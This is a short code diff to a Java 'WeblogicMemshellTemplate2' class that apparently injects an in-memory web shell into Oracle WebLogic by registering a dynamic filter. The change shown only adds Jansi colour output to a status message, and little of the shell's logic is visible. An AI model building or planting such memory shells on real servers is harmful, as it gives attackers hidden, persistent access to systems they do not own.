@@ -18,6 +18,8 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 
+import static org.fusesource.jansi.Ansi.ansi;
+
 public class WeblogicMemshellTemplate2 extends AbstractTranslet {
     public WeblogicMemshellTemplate2(){
         try{
@@ -68,7 +70,7 @@ public class WeblogicMemshellTemplate2 extends AbstractTranslet {
 
             // 判断一下，防止多次加载， 默认只加载一次，不需要重复加载
             if (!filterManager.isFilterRegistered(filterName)) {
-                System.out.println("[+] Add Dynamic Filter");
+                System.out.println( ansi().render("@|green [+] Add Dynamic Filter|@"));
 
                 ClassLoader cl = Thread.currentThread().getContextClassLoader();
                 Class clazz;
